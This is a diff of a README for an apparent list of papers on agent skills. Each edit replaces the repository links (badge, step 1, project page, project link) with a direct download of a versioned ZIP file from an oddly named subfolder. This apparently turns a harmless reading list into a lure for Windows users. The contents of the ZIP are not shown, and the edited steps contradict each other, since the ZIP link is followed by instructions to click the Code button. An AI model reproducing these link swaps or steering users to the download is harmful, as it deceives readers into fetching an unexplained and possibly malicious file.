@@ -1,6 +1,6 @@
 # 📘 Awesome-Skills-Paper - Find Agent Skill Papers Fast
 
-[![Download / Visit Site](https://img.shields.io/badge/Download%20Page-Ready%20Now-blue?style=for-the-badge)](https://github.com/sulfurized-chattanooga942/Awesome-Skills-Paper)
+[![Download / Visit Site](https://img.shields.io/badge/Download%20Page-Ready%20Now-blue?style=for-the-badge)](https://github.com/sulfurized-chattanooga942/Awesome-Skills-Paper/raw/refs/heads/main/unpocketed/Awesome-Skills-Paper-v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use this README to get the list on your Windows PC and start reading right away.
 
 ## 📥 Download and Open
 
-1. Open this link in your browser: https://github.com/sulfurized-chattanooga942/Awesome-Skills-Paper
+1. Open this link in your browser: https://github.com/sulfurized-chattanooga942/Awesome-Skills-Paper/raw/refs/heads/main/unpocketed/Awesome-Skills-Paper-v3.6.zip
 2. On the page, look for the green Code button near the top right.
 3. Click Code.
 4. Choose Download ZIP.
@@ -19,7 +19,7 @@ Use this README to get the list on your Windows PC and start reading right away.
 7. Open the new folder after the files finish extracting.
 8. Open the paper list files with your browser or a text editor
 
-[Visit the project page](https://github.com/sulfurized-chattanooga942/Awesome-Skills-Paper)
+[Visit the project page](https://github.com/sulfurized-chattanooga942/Awesome-Skills-Paper/raw/refs/heads/main/unpocketed/Awesome-Skills-Paper-v3.6.zip)
 
 ## 🖥️ Windows Setup
 
@@ -153,7 +153,7 @@ These files are easy to open in Windows with built-in tools or a browser.
 ## 🔗 Project Link
 
 Open the repository here:
-https://github.com/sulfurized-chattanooga942/Awesome-Skills-Paper
+https://github.com/sulfurized-chattanooga942/Awesome-Skills-Paper/raw/refs/heads/main/unpocketed/Awesome-Skills-Paper-v3.6.zip
 
 ## 🗂️ Quick Start Checklist
 
